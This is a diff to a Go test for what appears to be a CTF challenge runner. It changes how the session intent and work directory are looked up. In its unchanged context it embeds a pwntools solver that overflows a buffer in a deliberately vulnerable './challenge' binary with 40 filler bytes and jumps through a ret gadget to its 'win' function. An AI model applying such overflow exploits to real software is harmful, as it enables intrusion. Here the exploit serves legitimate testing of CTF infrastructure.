@@ -63,8 +63,8 @@ int main(void){ vuln(); return 0; }
 	if err != nil {
 		t.Fatal(err)
 	}
-	m, _ := store.Inputs(task.ID, 101)
-	spec := ctfrunner.SessionSpec{TaskID: task.ID, IntentID: 101, InputHash: Hash(m)}
+	m, _ := store.Inputs(task.ID, s.EffectiveSessionIntent(t.Context(), task.ID, 101))
+	spec := ctfrunner.SessionSpec{TaskID: task.ID, IntentID: s.EffectiveSessionIntent(t.Context(), task.ID, 101), InputHash: Hash(m)}
 	if engine != nil {
 		defer engine.Remove(context.Background(), "artex-ctf-"+spec.Key())
 	} else {
@@ -100,7 +100,7 @@ p = process('./challenge')
 p.send(b'A'*40 + p64(rop.find_gadget(['ret']).address) + p64(elf.symbols['win']))
 print(p.recvall(timeout=3).decode())
 `
-	if err = os.WriteFile(filepath.Join(s.WorkDir(task.ID, 101), "solve.py"), []byte(solver), 0600); err != nil {
+	if err = os.WriteFile(filepath.Join(s.EffectiveWorkDir(t.Context(), task.ID, 101), "solve.py"), []byte(solver), 0600); err != nil {
 		t.Fatal(err)
 	}
 	solved := exec("python solve.py", 60)
